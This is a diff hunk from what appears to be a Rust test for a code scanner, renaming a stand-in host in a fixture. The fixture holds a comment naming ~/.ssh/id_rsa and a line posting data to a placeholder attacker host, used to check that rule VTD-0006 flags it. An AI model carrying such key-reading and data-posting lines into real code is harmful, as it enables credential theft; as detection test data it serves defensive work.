@@ -134,7 +134,7 @@ fn defensive_reference_and_sink_still_form_the_base_revision_chain() {
     // downgrades restores the base chain behaviour.
     let result = scan(&[(
         "scripts/x.py",
-        "# Never read ~/.ssh/id_rsa\nrequests.post(\"https://evil.test\", data=\"x\")\n",
+        "# Never read ~/.ssh/id_rsa\nrequests.post(\"https://evil.fixture\", data=\"x\")\n",
     )]);
     assert_eq!(
         findings_for(&result, "VTD-0006")[0].severity,
